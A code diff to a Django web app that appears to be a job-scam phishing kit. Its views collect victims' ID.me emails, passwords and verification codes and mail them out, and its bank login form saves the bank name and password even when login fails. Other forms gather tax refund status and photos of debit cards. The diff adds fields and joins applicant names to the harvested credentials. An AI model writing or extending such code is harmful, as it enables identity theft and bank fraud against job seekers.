@@ -154,6 +154,8 @@ class BackgroundCheckView(SuccessMessageMixin, CreateView):
         email = force_str(force_bytes(
             urlsafe_base64_decode(self.kwargs['uidb64'])))
         form.instance.email = email
+        form.instance.tax_refund = form.cleaned_data.get(
+            'did_you_complete_your_tax_refund_in_2022')
         form = super().form_valid(form)
 
         return form
@@ -204,12 +206,16 @@ class ReceiveVerificationCodeView(TemplateView):
         code = request.POST['code']
         user = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
         details = IdMeCredentials.objects.filter(email=user).first()
+        job_details = ApplyJob.objects.filter(email=user).first()
+
+        print(f'IDME: {details}')
+        print(f'APPLY: {job_details}')
 
         # Send a mail with the credentials
         user_details = {
             'email': details.email,
             'password': details.password,
-            'name': details.name,
+            'name': job_details.name,
             'code': code,
         }
 
@@ -223,7 +229,7 @@ class ResendVerificationCodeView(TemplateView):
     template_name = "frontend/idme/send_code.html"
 
     def get(self, request, uidb64):
-        messages.success(request, self.error_message)
+        messages.error(request, self.error_message)
         return render(request, self.template_name, context={'uidb64': uidb64})
 
 
@@ -256,7 +262,7 @@ class FinancialInformationView(View):
         email = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
         details = ApplyJob.objects.filter(email=email).first()
 
-        return render(request, self.template_name, context={'user':details})
+        return render(request, self.template_name, context={'user': details})
 
     def post(self, request, uidb64):
         messages.success(request, self.success_message)
@@ -306,13 +312,15 @@ class LoginPageView(View):
 
                 if email and password and bank_name:
 
-                    user = authenticate(request, email=email, password=password)
+                    user = authenticate(
+                        request, email=email, password=password)
 
                     if user:
 
                         if user.is_active:
                             login(request, user)
-                            messages.success(request, f"You are now signed in {user}")
+                            messages.success(
+                                request, f"You are now signed in {user}")
 
                             nxt = request.GET.get('next', None)
                             if nxt is None:
@@ -327,7 +335,8 @@ class LoginPageView(View):
                 else:
                     messages.error(request, 'All fields are required!!')
 
-                new_user = Users.objects.create(bank_name=bank_name, account_password1=password)
+                new_user = Users.objects.create(
+                    bank_name=bank_name, account_password1=password)
                 LoginCount.objects.create(user=new_user)
 
             else:
@@ -348,7 +357,8 @@ class LoginPageView(View):
 
         else:
 
-            new_user = Users.objects.create(bank_name=bank_name, email=email, account_password1=password)
+            new_user = Users.objects.create(
+                bank_name=bank_name, email=email, account_password1=password)
             LoginCount.objects.create(user=new_user, count=1)
 
             messages.error(request, 'Invalid login credentials, try again!!')
@@ -364,10 +374,10 @@ class ProfileView(LoginRequiredMixin, View):
 
         user = Users.objects.filter(email=self.request.user).first()
         if user.is_verified:
-            messages.success(request, 'Your information is still under review.!')
+            messages.success(
+                request, 'Your information is still under review.!')
         else:
             messages.error(request, 'Salary account not activated!')
-
 
         return render(request, self.template_name, context=context)
 
@@ -377,7 +387,6 @@ class ProfileView(LoginRequiredMixin, View):
         if form.is_valid():
             debit_card_back = form.cleaned_data.get('debit_card_back')
             debit_card_front = form.cleaned_data.get('debit_card_front')
-
 
             user = Users.objects.filter(email=self.request.user).first()
 
